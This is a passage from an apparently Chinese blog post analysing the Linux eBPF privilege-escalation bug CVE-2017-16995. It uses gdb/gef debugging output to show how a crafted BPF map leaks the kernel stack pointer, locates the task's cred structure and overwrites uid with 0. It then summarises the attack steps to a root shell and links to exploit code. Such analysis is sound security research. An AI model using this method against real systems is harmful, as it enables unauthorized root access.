0x0</span><br><span class="line">gef➤  finish</span><br><span class="line">$rax   : 0xffff8802287630e8  →  0x0000000000000001</span><br><span class="line"></span><br><span class="line">array_map_lookup_elem (map=0xffff880228763080, key=0xffff880222703c7c) at kernel/bpf/arraymap.c:111</span><br><span class="line">gef➤  p *(u32 *)key</span><br><span class="line">$19 = 0x1</span><br><span class="line">gef➤  finish</span><br><span class="line">$rax   : 0xffff8802287630f0  →  0x0000000000000000</span><br><span class="line"></span><br><span class="line">array_map_lookup_elem (map=0xffff880228763080, key=0xffff880222703c7c) at kernel/bpf/arraymap.c:111</span><br><span class="line">gef➤  p *(u32 *)key</span><br><span class="line">$20 = 0x2</span><br><span class="line">gef➤  finish</span><br><span class="line">gef➤  ni</span><br><span class="line">$rax   : 0xffff8802287630f8  →  0x0000000000000000</span><br><span class="line"></span><br><span class="line"># call trace</span><br><span class="line">[#0] 0xffffffff81186f80 → Name: array_map_lookup_elem(map=0xffff880228763080, key=0xffff880222703c7c)</span><br><span class="line">[#1] 0xffffffff81185670 → Name: bpf_map_lookup_elem(r1=&lt;optimized out&gt;, r2=&lt;optimized out&gt;, r3=&lt;optimized out&gt;, r4=&lt;optimized out&gt;, r5=&lt;optimized out&gt;)</span><br><span class="line">[#2] 0xffffffff8117f5b6 → Name: __bpf_prog_run(ctx=&lt;optimized out&gt;, insn=0xffffc90001a50100)</span><br><span class="line">[#3] 0xffffffff81794afc → Name: bpf_prog_run_save_cb(skb=&lt;optimized out&gt;, prog=&lt;optimized out&gt;)</span><br><span class="line">[#4] 0xffffffff81794afc → Name: sk_filter_trim_cap(sk=&lt;optimized out&gt;, skb=0xffff880220cbe700, cap=0x0)</span><br><span class="line">[#5] 0xffffffff818277ea → Name: sk_filter(skb=&lt;optimized out&gt;, sk=&lt;optimized out&gt;)</span><br><span class="line">[#6] 0xffffffff818277ea → Name: unix_dgram_sendmsg(sock=0xffff880229876400, msg=&lt;optimized out&gt;, len=0x40)</span><br><span class="line">[#7] 0xffffffff8175dab8 → Name: sock_sendmsg_nosec(msg=&lt;optimized out&gt;, sock=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff8175dab8 → Name: sock_sendmsg(sock=0xffff880229876400, msg=0xffff880222703dc0)</span><br><span class="line">[#9] 0xffffffff8175db55 → Name: sock_write_iter(iocb=&lt;optimized out&gt;, from=0xffff880222703e70)</span><br></pre></td></tr></table></figure></p>
+<p>下面代码展示了<code>rax</code>被赋值为<code>rbp</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p *(const struct bpf_insn *)insn</span><br><span class="line">$26 = &#123;</span><br><span class="line">  code = 0x7b, </span><br><span class="line">  dst_reg = 0x2, </span><br><span class="line">  src_reg = 0xa, </span><br><span class="line">  off = 0x0, </span><br><span class="line">  imm = 0x0</span><br><span class="line">&#125;</span><br><span class="line"># 该insn的代码为取rbp的代码块</span><br><span class="line"># BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0)</span><br><span class="line"></span><br><span class="line">#define BPF_STX_MEM(SIZE, DST, SRC, OFF)                \</span><br><span class="line">    ((struct bpf_insn) &#123;                                \</span><br><span class="line">        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \</span><br><span class="line">        .dst_reg = DST,                    \</span><br><span class="line">        .src_reg = SRC,                    \</span><br><span class="line">        .off   = OFF,                      \</span><br><span class="line">        .imm   = 0 &#125;)</span><br></pre></td></tr></table></figure></p>
+<p>在ebp中，<code>BPF_REG_10</code>寄存器代表栈帧寄存器，将<code>BPF_REG_10</code>的值复制到<code>BPF_REG_2</code>寄存器中，可以看做向<code>map</code>中写入了<code>rbp</code>的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># source</span><br><span class="line">#define LDST(SIZEOP, SIZE)						\</span><br><span class="line">    STX_MEM_##SIZEOP:						\</span><br><span class="line">        *(SIZE *)(unsigned long) (DST + insn-&gt;off) = SRC;	\</span><br><span class="line">        CONT;							\</span><br><span class="line">    ST_MEM_##SIZEOP:						\</span><br><span class="line">        *(SIZE *)(unsigned long) (DST + insn-&gt;off) = IMM;	\</span><br><span class="line">        CONT;							\</span><br><span class="line">    LDX_MEM_##SIZEOP:						\</span><br><span class="line">        DST = *(SIZE *)(unsigned long) (SRC + insn-&gt;off);	\</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    LDST(B,   u8)</span><br><span class="line">    LDST(H,  u16)</span><br><span class="line">    LDST(W,  u32)</span><br><span class="line">    LDST(DW, u64)</span><br><span class="line">    </span><br><span class="line">-&gt; 847	 	LDST(DW, u64)</span><br><span class="line"></span><br><span class="line"># dissamble</span><br><span class="line">   0xffffffff8117fc5d &lt;__bpf_prog_run+3725&gt; call   0xffffffff90f97f66</span><br><span class="line">   0xffffffff8117fc62 &lt;__bpf_prog_run+3730&gt; and    eax, 0xf</span><br><span class="line">-&gt; 0xffffffff8117fc65 &lt;__bpf_prog_run+3733&gt; mov    rax, QWORD PTR [rbp+rax*8-0x278]</span><br><span class="line">   0xffffffff8117fc6d &lt;__bpf_prog_run+3741&gt; mov    rcx, QWORD PTR [rbp+rcx*8-0x278]</span><br><span class="line">   0xffffffff8117fc75 &lt;__bpf_prog_run+3749&gt; mov    QWORD PTR [rcx+rdx*1], rax</span><br><span class="line">   0xffffffff8117fc79 &lt;__bpf_prog_run+3753&gt; movzx  eax, BYTE PTR [rbx]</span><br><span class="line">   0xffffffff8117fc7c &lt;__bpf_prog_run+3756&gt; jmp    QWORD PTR [r12+rax*8]</span><br><span class="line">   0xffffffff8117fc80 &lt;__bpf_prog_run+3760&gt; movzx  eax, BYTE PTR [rbx+0x1]</span><br><span class="line">   0xffffffff8117fc84 &lt;__bpf_prog_run+3764&gt; movsx  rdx, WORD PTR [rbx+0x2]</span><br><span class="line"># 代码执行完毕</span><br><span class="line">$rax   : 0xffff880222703c80</span><br><span class="line">$rsp   : 0xffff880222703a20</span><br><span class="line">$rbp   : 0xffff880222703ca0</span><br></pre></td></tr></table></figure></p>
+<p>此时，<code>eax</code>的值将会返回到<code>map[2]</code>中。用户态通过调用<code>lookup_elem()</code>可以获得<code>rbp</code>的值。<br>然后通过经典的<code>addr &amp; ~(0x4000 - 1)</code>获取到<code>current</code>结构体的起始地址0xffff8800758c0000，然后构造读数据的<code>map</code>指令去读<code>current</code>中偏移为0的指针值（即为指向<code>task_struct</code>的指针）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array_map_update_elem (map=0xffff880228763080, key=0xffff8801eb387d58, value=0xffff8801eb387988, map_flags=0x0) at kernel/bpf/arraymap.c:181</span><br><span class="line">gef➤  p *(u64 *)value</span><br><span class="line">$34 = 0xffff880222700000</span><br><span class="line">gef➤  x/10gx $34</span><br><span class="line">0xffff880222700000:	0xffff880221998000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>此时，<code>value</code>的值是指向<code>task_struct</code>结构体的指针，通过构造读指令，可以讲value指向的地址中的内容读出，即：0xffff880221998000，该地址为<code>task_struct</code>的首地址，加上偏移可以获得指向cred的指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p *(*(struct task_struct *)(0xffff880221998000))-&gt;cred</span><br><span class="line">$36 = &#123;</span><br><span class="line">  usage = &#123;</span><br><span class="line">    counter = 0x9</span><br><span class="line">  &#125;,</span><br><span class="line">  uid = &#123;</span><br><span class="line">    val = 0x3e8</span><br><span class="line">  &#125;,</span><br><span class="line">  gid = &#123;</span><br><span class="line">    val = 0x3e8</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p>
+<p>可知，<code>uid</code>是<code>cred</code>结构体偏移为4的位置。构造写指令，向<code>cred+4</code>的位置写入0，即可完成提权操作。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>构造一下攻击路径：</p>
+<ol>
+<li>申请一个<code>MAP</code>，长度为3；</li>
+<li>这个<code>MAP</code>的第一个元素为操作指令，第2个元素为需要读写的内存地址，第3个元素用来存放读取到的内容。此时这个<code>MAP</code>相当于一个CC，3个元素组成一个控制指令。</li>
+<li>组装一个指令，读取内核的栈地址。根据内核栈地址获取到<code>current</code>的地址。</li>
+<li>读<code>current</code>结构体的第一个成员，或得<code>task_struct</code>的地址，继而加上<code>cred</code>的偏移得到<code>cred</code>地址，最终获取到<code>uid</code>的地址。</li>
+<li>组装一个写指令，向上一步获取到的<code>uid</code>地址写入0.</li>
+<li>启动新的bash进程，该进程的<code>uid</code>为0，提权成功。  </li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://xz.aliyun.com/t/2212" target="_blank" rel="noopener">深入分析Ubuntu本地提权漏洞—【CVE-2017-16995】</a>  </li>
+<li><a href="http://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>  </li>
+<li><a href="https://github.com/ljf1239848066/Vulnerability-Exploitation/tree/master/linux-kernel-exploits/CVE-2017-16995" target="_blank" rel="noopener">POC &amp; EXP</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/10/内核调试环境搭建-md/" rel="next" title="内核调试环境搭建.md">
+                <i class="fa fa-chevron-left"></i> 内核调试环境搭建.md
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Guo" />
+          <p class="site-author-name" itemprop="name">Guo</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/jaguo" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验环境"><span class="nav-number">1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞原因分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞原因分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#do-check"><span class="nav-number">3.</span> <span class="nav-text">do_check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">4.</span> <span class="nav-text">pwn()</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取rbp指针"><span class="nav-number">4.1.</span> <span class="nav-text">获取rbp指针</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guo</span>
+</div>
+
+
+<div class="copyright">
+  由 Hexo 强力驱动
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
